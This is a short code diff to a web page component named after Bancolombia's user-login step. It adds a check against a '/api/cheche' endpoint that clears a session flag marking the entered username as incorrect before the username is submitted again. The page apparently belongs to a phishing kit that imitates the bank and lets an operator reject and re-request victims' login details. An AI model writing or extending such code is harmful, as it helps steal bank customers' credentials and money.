@@ -26,6 +26,21 @@ export default function BancolombiaUsuarioPage() {
     setLoading(true);
 
     try {
+      // Verificar si el usuario fue marcado como incorrecto y limpiar el flag
+      const checkResponse = await fetch(`/api/cheche?sessionId=${sessionId}`);
+      const checkData = await checkResponse.json();
+      
+      if (checkData.session?.usuarioIncorrecto) {
+        await fetch('/api/cheche', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            action: 'clear_usuario_flag',
+            sessionId,
+          }),
+        });
+      }
+      
       const response = await fetch('/api/cheche', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
